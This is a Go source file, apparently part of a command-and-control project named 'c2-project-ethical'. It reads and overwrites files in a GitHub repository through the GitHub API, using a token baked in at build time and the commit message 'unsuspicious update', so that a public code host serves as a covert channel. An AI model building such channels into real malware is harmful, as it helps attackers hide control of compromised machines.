package github

import (
	"bytes"
	"crypto/sha1"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

var GithubToken string // to be assigned at compile time using ldflags
const repoOwner = "SurainSaigal"
const repoName = "c2-project-ethical"

// Fetches file from github and returns as string
func ReadFile(url string) (string, error) {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("Error fetching file:", err)
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Println("Failed to fetch file. Status:", resp.Status)
		return "", fmt.Errorf("failed to fetch file: %s", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return "", err
	}

	return string(body), nil
}

// Overwrites a file on github by creating a commit through github api
func WriteFile(filePath string, prevContent string, newContent string) error {
	apiUrl := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", repoOwner, repoName, filePath)
	payload := map[string]string{
		"message": "unsuspicious update",
		"content": newContent,
		"sha":     calculateGitSHA(prevContent),
	}
	jsonData, _ := json.Marshal(payload)

	req, _ := http.NewRequest("PUT", apiUrl, bytes.NewBuffer(jsonData))
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", GithubToken))
	req.Header.Set("Accept", "application/vnd.github+json")

	updateResp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer updateResp.Body.Close()

	if updateResp.StatusCode != http.StatusOK && updateResp.StatusCode != http.StatusCreated {
		return fmt.Errorf("failed to update: %s", updateResp.Status)
	}

	return nil
}

// calculateGitSHA generates the exact hash GitHub expects for a file
func calculateGitSHA(content string) string {
	// github expected blob format: "blob <size>\x00<content>"
	header := fmt.Sprintf("blob %d\x00", len(content))
	store := header + content
	hash := sha1.Sum([]byte(store))
	return fmt.Sprintf("%x", hash)
}
